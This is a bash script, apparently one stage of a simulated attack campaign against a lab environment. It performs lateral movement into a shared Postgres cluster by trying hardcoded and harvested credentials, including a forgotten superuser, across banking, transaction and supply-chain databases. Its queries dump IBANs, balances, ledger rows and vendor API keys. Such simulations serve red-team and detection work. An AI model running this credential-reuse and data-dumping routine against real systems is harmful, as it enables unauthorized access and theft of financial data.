#!/bin/bash
set -uo pipefail
source "$(dirname "$0")/common.sh"

# Stage 4: data-tier lateral movement. Postgres runs with
# POSTGRES_HOST_AUTH_METHOD=trust, so reaching :5432 at all is already
# game over -- these per-DB passwords are attempted anyway because a real
# attacker who harvested them from actuator/env wouldn't know trust auth
# was in play, and attempting the forgotten `legacy_reporting` superuser
# afterwards is the realistic "credential reuse found something extra"
# step: one shared cluster, three line-of-business DBs, no network
# isolation between them once you're in.
if ! have_pivot; then
  log "LATERAL-PG" "No data-tier route yet -- skipping"
  exit 0
fi

export PGCONNECT_TIMEOUT=5
[ -f "$CREDS_FILE" ] && source "$CREDS_FILE"

log "LATERAL-PG" "Connecting to shared Postgres cluster at ${POSTGRES_IP}:5432"

try_db() {
  local db="$1" user="$2" pass="$3" query="$4"
  log "LATERAL-PG" "Trying ${user}@${db}"
  PGPASSWORD="$pass" psql -h "$POSTGRES_IP" -U "$user" -d "$db" -c "$query" \
    2>&1 | tee -a "$LOG_DIR/attacker-campaign.log"
}

try_db "core_banking" "${CORE_BANKING_DB_USER:-core_banking_svc}" "${CORE_BANKING_DB_PASS:-CoreBank2024!}" \
  "SELECT account_id, iban, balance_cents FROM accounts LIMIT 10;"

try_db "transactions" "transactions_svc" "Txn#Service24" \
  "SELECT txn_id, account_id, amount_cents FROM ledger LIMIT 10;"

# NOTE: SUPPLY_CHAIN_USER/PASS in $CREDS_FILE is the vendor-portal
# *application* login harvested from supply-chain's HTML comment
# (e.g. svc-vendor-admin), not a Postgres role -- it doesn't exist on
# the DB side, so the DB-tier credential is used directly here instead.
try_db "supply_chain" "supply_chain_svc" "vendor123" \
  "SELECT vendor_id, name, api_key FROM vendors LIMIT 10;"

log "LATERAL-PG" "Trying forgotten legacy_reporting superuser across all three DBs"
for db in core_banking transactions supply_chain; do
  try_db "$db" "legacy_reporting" "reporting" "SELECT current_database(), current_user;"
done

log "LATERAL-PG" "data-tier lateral movement complete"
